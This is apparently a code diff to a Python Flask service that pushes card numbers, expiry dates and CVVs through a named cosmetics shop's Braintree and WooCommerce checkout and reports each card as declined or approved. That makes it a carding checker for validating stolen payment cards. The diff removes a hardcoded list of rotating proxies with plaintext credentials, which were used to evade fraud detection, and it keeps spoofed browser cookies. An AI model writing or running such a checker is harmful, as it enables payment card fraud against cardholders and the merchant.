@@ -2,32 +2,13 @@ import requests
 import re
 import json
 import uuid
-from time import sleep
 from flask import Flask, request
-from itertools import cycle
 
 app = Flask(__name__)
 
-proxies_list = [
-    "142.111.48.253:7030:fvbysspi:bsbh3trstb1c",
-    "31.59.20.176:6754:fvbysspi:bsbh3trstb1c",
-    "38.170.176.177:5572:fvbysspi:bsbh3trstb1c",
-    "198.23.239.134:6540:fvbysspi:bsbh3trstb1c",
-    "45.38.107.97:6014:fvbysspi:bsbh3trstb1c",
-    "107.172.163.27:6543:fvbysspi:bsbh3trstb1c",
-    "64.137.96.74:6641:fvbysspi:bsbh3trstb1c",
-    "216.10.27.159:6837:fvbysspi:bsbh3trstb1c",
-    "142.111.67.146:5611:fvbysspi:bsbh3trstb1c",
-    "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
-]
-
-proxies_cycle = cycle(proxies_list)
-
 class EcosmeticsPayment:
-    def __init__(self, proxy=None):
+    def __init__(self):
         self.session = requests.Session()
-        if proxy:
-            self.session.proxies.update({'http': proxy, 'https': proxy})
         self.cookies = {
             '_gcl_au': '1.1.472509716.1760778293',
             '_ga': 'GA1.1.260355234.1760778309',
@@ -118,7 +99,7 @@ class EcosmeticsPayment:
         }
         
         try:
-            response = requests.post(
+            response = self.session.post(
                 'https://payments.braintree-api.com/graphql',
                 headers=braintree_headers,
                 json=tokenize_data,
@@ -157,7 +138,7 @@ class EcosmeticsPayment:
             r'var wc_checkout_params = {[^}]*"nonce":"([^"]+)"',
             r'woocommerce_checkout_params[^}]*"nonce":"([^"]+)"',
         ]
-       
+        
         for pattern in patterns:
             match = re.search(pattern, response.text)
             if match:
@@ -202,7 +183,6 @@ class EcosmeticsPayment:
             return {"status": "Declined", "response": "Payment failed"}
         except Exception:
             return {"status": "Error", "response": "Invalid response"}
-
 
     def process_payment(self, card_number, exp_month, exp_year, cvv):
         try:
@@ -271,11 +251,7 @@ def process_cc(cc):
     if len(exp_year) == 2:
         exp_year = '20' + exp_year
     
-    proxy_str = next(proxies_cycle)
-    ip, port, user, pw = proxy_str.split(':')
-    proxy = f"http://{user}:{pw}@{ip}:{port}"
-    
-    payment = EcosmeticsPayment(proxy)
+    payment = EcosmeticsPayment()
     result = payment.process_payment(card_number, exp_month, exp_year, cvv)
     
     return f"{result['status']}|{result['response']}"
